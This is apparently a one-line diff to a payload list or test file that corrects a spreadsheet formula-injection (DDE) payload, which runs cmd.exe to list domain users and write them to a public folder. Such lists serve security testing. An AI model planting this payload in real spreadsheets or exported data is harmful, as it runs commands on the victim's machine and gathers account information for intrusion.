@@ -1,1 +1,1 @@
-=cmd|' /C net users /domain > /C:\Users\Public\test.txt'!notthissheet
+=cmd|' /C net users /domain > C:\Users\Public\test.txt'!notthissheet
